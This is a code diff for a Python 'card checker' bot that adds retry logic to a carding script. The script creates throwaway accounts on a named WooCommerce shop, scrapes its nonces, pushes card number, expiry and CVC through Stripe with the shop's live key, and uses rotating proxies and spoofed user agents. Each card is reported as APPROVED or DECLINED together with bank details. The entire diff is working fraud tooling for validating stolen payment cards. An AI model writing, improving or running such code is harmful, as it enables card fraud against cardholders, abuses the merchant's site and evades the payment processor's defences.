@@ -195,54 +195,83 @@ def get_country_emoji(country_code):
     except:
         return ''
 
-def create_new_account(session, proxy_str):
-    """Create a new account for each card with proxy"""
-    try:
-        proxies = parse_proxy(proxy_str)
-        
-        # Step 1: Get login nonce
-        login_page_res = session.get('https://orevaa.com/my-account/', proxies=proxies, timeout=30)
-        
-        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
-        if not login_nonce_match:
-            return False, "Failed to get login nonce"
-        login_nonce = login_nonce_match.group(1)
-
-        # Step 2: Register a new account with random email ONLY
-        random_email = generate_random_email()
-        
-        register_data = {
-            'email': random_email, 
-            'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/my-account/', 
-            'register': 'Register',
-        }
-        
-        reg_response = session.post('https://orevaa.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
-        
-        # Check if registration was successful
-        if reg_response.status_code in [302, 303]:
-            return True, "Account created"
-        else:
-            return True, "Account might be created"
+def create_new_account_with_retry(session, proxy_str, max_retries=3):
+    """Create a new account for each card with proxy and retry logic"""
+    for attempt in range(max_retries):
+        try:
+            proxies = parse_proxy(proxy_str)
             
-    except Exception as e:
-        return False, f"Account error: {str(e)}"
+            # Step 1: Get login nonce
+            login_page_res = session.get('https://orevaa.com/my-account/', proxies=proxies, timeout=30)
+            
+            login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
+            if not login_nonce_match:
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+                    continue
+                return False, "Failed to get login nonce"
+            login_nonce = login_nonce_match.group(1)
 
-def get_payment_nonce(session, proxy_str):
-    """Get payment nonce from the payment method page with proxy"""
-    try:
-        proxies = parse_proxy(proxy_str)
-        
-        payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
-        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
-        if not payment_nonce_match:
-            return None, "Failed to get payment nonce"
-        
-        ajax_nonce = payment_nonce_match.group(1)
-        return ajax_nonce, "Success"
-    except Exception as e:
-        return None, f"Payment nonce error: {str(e)}"
+            # Step 2: Register a new account with random email ONLY
+            random_email = generate_random_email()
+            
+            register_data = {
+                'email': random_email, 
+                'woocommerce-register-nonce': login_nonce,
+                '_wp_http_referer': '/my-account/', 
+                'register': 'Register',
+            }
+            
+            reg_response = session.post('https://orevaa.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
+            
+            # Check if registration was successful
+            if reg_response.status_code in [302, 303]:
+                return True, "Account created"
+            else:
+                return True, "Account might be created"
+                
+        except Exception as e:
+            if attempt < max_retries - 1:
+                print(f"Account creation attempt {attempt + 1} failed, retrying...")
+                time.sleep(2)
+                continue
+            return False, f"Account error: {str(e)}"
+
+def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
+    """Get payment nonce from the payment method page with proxy and retry logic"""
+    for attempt in range(max_retries):
+        try:
+            proxies = parse_proxy(proxy_str)
+            
+            payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
+            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
+            if not payment_nonce_match:
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+                    continue
+                return None, "Failed to get payment nonce"
+            
+            ajax_nonce = payment_nonce_match.group(1)
+            return ajax_nonce, "Success"
+        except Exception as e:
+            if attempt < max_retries - 1:
+                print(f"Payment nonce attempt {attempt + 1} failed, retrying...")
+                time.sleep(2)
+                continue
+            return None, f"Payment nonce error: {str(e)}"
+
+def stripe_api_call_with_retry(url, headers, data, proxies, max_retries=3):
+    """Stripe API call with retry logic"""
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
+            return response
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+            if attempt < max_retries - 1:
+                print(f"Stripe API attempt {attempt + 1} failed, retrying...")
+                time.sleep(2)
+                continue
+            raise e
 
 def get_3ds_challenge_mandated(website_response, proxy_str):
     """Extract acsChallengeMandated value from 3DS authentication response"""
@@ -282,12 +311,11 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                 
                 print(f"DEBUG: Making authenticate request...")  # Debug line
                 
-                auth_response = requests.post(
+                auth_response = stripe_api_call_with_retry(
                     'https://api.stripe.com/v1/3ds2/authenticate',
-                    headers=headers,
-                    data=auth_data,
-                    proxies=proxies,
-                    timeout=30
+                    headers,
+                    auth_data,
+                    proxies
                 )
                 
                 print(f"DEBUG: Auth response status: {auth_response.status_code}")  # Debug line
@@ -345,25 +373,27 @@ def get_final_message(website_response, proxy_str):
         return "Unknown response"
 
 def check_card_stripe(cc_line):
-    """Main function to check card via Stripe (single card)"""
+    """Main function to check card via Stripe (single card) with retry logic"""
     start_time = time.time()
+    max_retries = 3
     
-    try:
-        # Parse CC
-        n, mm, yy, cvc = cc_line.strip().split('|')
-        if not yy.startswith('20'):
-            yy = '20' + yy
-        
-        # FIRST: Get BIN information before anything else
-        print("Getting BIN information...")
-        bin_info = get_bin_info(n[:6])
-        print(f"BIN Info retrieved: {bin_info}")
-        
-        # Load proxies
-        proxies_list = load_proxies()
-        if not proxies_list:
-            elapsed_time = time.time() - start_time
-            return f"""
+    for retry_count in range(max_retries):
+        try:
+            # Parse CC
+            n, mm, yy, cvc = cc_line.strip().split('|')
+            if not yy.startswith('20'):
+                yy = '20' + yy
+            
+            # FIRST: Get BIN information before anything else
+            print("Getting BIN information...")
+            bin_info = get_bin_info(n[:6])
+            print(f"BIN Info retrieved: {bin_info}")
+            
+            # Load proxies
+            proxies_list = load_proxies()
+            if not proxies_list:
+                elapsed_time = time.time() - start_time
+                return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -378,24 +408,28 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        # Use random proxy
-        proxy_str = random.choice(proxies_list)
-        
-        session = requests.Session()
-        session.headers.update({
-            'user-agent': get_rotating_user_agent()
-        })
+            # Use random proxy
+            proxy_str = random.choice(proxies_list)
+            
+            session = requests.Session()
+            session.headers.update({
+                'user-agent': get_rotating_user_agent()
+            })
 
-        if len(yy) == 4:
-            yy_stripe = yy[-2:]
-        else:
-            yy_stripe = yy
+            if len(yy) == 4:
+                yy_stripe = yy[-2:]
+            else:
+                yy_stripe = yy
 
-        # Create a NEW account for this card
-        account_created, account_msg = create_new_account(session, proxy_str)
-        if not account_created:
-            elapsed_time = time.time() - start_time
-            return f"""
+            # Create a NEW account for this card with retry
+            account_created, account_msg = create_new_account_with_retry(session, proxy_str)
+            if not account_created:
+                if retry_count < max_retries - 1:
+                    print(f"Account creation failed, retry {retry_count + 1}/{max_retries}")
+                    time.sleep(2)
+                    continue
+                elapsed_time = time.time() - start_time
+                return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -410,11 +444,15 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        # Get payment nonce
-        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
-        if not ajax_nonce:
-            elapsed_time = time.time() - start_time
-            return f"""
+            # Get payment nonce with retry
+            ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str)
+            if not ajax_nonce:
+                if retry_count < max_retries - 1:
+                    print(f"Payment nonce failed, retry {retry_count + 1}/{max_retries}")
+                    time.sleep(2)
+                    continue
+                elapsed_time = time.time() - start_time
+                return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -429,66 +467,67 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        # Prepare Stripe data with the current card
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
+            # Prepare Stripe data with the current card
+            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
 
-        proxies = parse_proxy(proxy_str)
-        
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)
+            proxies = parse_proxy(proxy_str)
+            
+            # Stripe API call with retry
+            response = stripe_api_call_with_retry('https://api.stripe.com/v1/payment_methods', stripe_headers, data, proxies)
 
-        # Check if response has 'id' before extracting
-        response_data = response.json()
-        
-        if 'id' in response_data:
-            pm_id = response_data['id']
+            # Check if response has 'id' before extracting
+            response_data = response.json()
             
-            # Second request (admin ajax)
-            headers2 = {
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.6',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://orevaa.com',
-                'priority': 'u=1, i',
-                'referer': 'https://orevaa.com/my-account/add-payment-method/',
-                'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'sec-gpc': '1',
-                'user-agent': get_rotating_user_agent(),
-                'x-requested-with': 'XMLHttpRequest',
-            }
-
-            data2 = {
-                'action': 'wc_stripe_create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': pm_id,
-                'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': ajax_nonce,
-            }
-
-            response2 = session.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
-            website_response = response2.json()
-            
-            # Extract setup intent ID for 3DS check
-            setup_intent_id = None
-            if website_response.get('success'):
-                data_section = website_response.get('data', {})
-                setup_intent_id = data_section.get('id')
-            
-            # Get final message with 3DS info
-            final_message = get_final_message(website_response, proxy_str)
-            
-            elapsed_time = time.time() - start_time
-            
-            # Check the actual status from the response
-            if website_response.get('success'):
-                data_section = website_response.get('data', {})
-                status = data_section.get('status', '')
+            if 'id' in response_data:
+                pm_id = response_data['id']
                 
-                if status == 'succeeded':
-                    return f"""
+                # Second request (admin ajax)
+                headers2 = {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.6',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://orevaa.com',
+                    'priority': 'u=1, i',
+                    'referer': 'https://orevaa.com/my-account/add-payment-method/',
+                    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-gpc': '1',
+                    'user-agent': get_rotating_user_agent(),
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+
+                data2 = {
+                    'action': 'wc_stripe_create_and_confirm_setup_intent',
+                    'wc-stripe-payment-method': pm_id,
+                    'wc-stripe-payment-type': 'card',
+                    '_ajax_nonce': ajax_nonce,
+                }
+
+                response2 = session.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
+                website_response = response2.json()
+                
+                # Extract setup intent ID for 3DS check
+                setup_intent_id = None
+                if website_response.get('success'):
+                    data_section = website_response.get('data', {})
+                    setup_intent_id = data_section.get('id')
+                
+                # Get final message with 3DS info
+                final_message = get_final_message(website_response, proxy_str)
+                
+                elapsed_time = time.time() - start_time
+                
+                # Check the actual status from the response
+                if website_response.get('success'):
+                    data_section = website_response.get('data', {})
+                    status = data_section.get('status', '')
+                    
+                    if status == 'succeeded':
+                        return f"""
 APPROVED CC ✅
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -502,9 +541,24 @@ APPROVED CC ✅
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-                elif status == 'requires_action':
-                    return f"""
+                    elif status == 'requires_action':
+                        return f"""
 APPROVED CC ✅
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                    else:
+                        return f"""
+DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
@@ -518,6 +572,28 @@ APPROVED CC ✅
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
                 else:
+                    # Check for specific error messages that should be treated as APPROVED
+                    error_data = website_response.get('data', {})
+                    if 'error' in error_data:
+                        error_msg = error_data['error'].get('message', '').lower()
+                        
+                        # Treat these errors as APPROVED
+                        if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
+                            return f"""
+APPROVED CCN ✅
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                    
                     return f"""
 DECLINED CC ❌
 
@@ -532,47 +608,14 @@ DECLINED CC ❌
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-            else:
-                # Check for specific error messages that should be treated as APPROVED
-                error_data = website_response.get('data', {})
-                if 'error' in error_data:
-                    error_msg = error_data['error'].get('message', '').lower()
                     
-                    # Treat these errors as APPROVED
-                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
-                        return f"""
-APPROVED CCN ✅
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-                
+            else:
+                if retry_count < max_retries - 1:
+                    print(f"Stripe validation failed, retry {retry_count + 1}/{max_retries}")
+                    time.sleep(2)
+                    continue
+                elapsed_time = time.time() - start_time
                 return f"""
-DECLINED CC ❌
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-                
-        else:
-            elapsed_time = time.time() - start_time
-            return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -587,11 +630,15 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-    except Exception as e:
-        elapsed_time = time.time() - start_time
-        # Get BIN info even for errors to ensure we have it
-        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
-        return f"""
+        except Exception as e:
+            if retry_count < max_retries - 1:
+                print(f"Request failed with error: {str(e)}, retry {retry_count + 1}/{max_retries}")
+                time.sleep(2)
+                continue
+            elapsed_time = time.time() - start_time
+            # Get BIN info even for errors to ensure we have it
+            bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
+            return f"""
 ERROR ❌
 
 💳𝗖𝗖 ⇾ {cc_line}
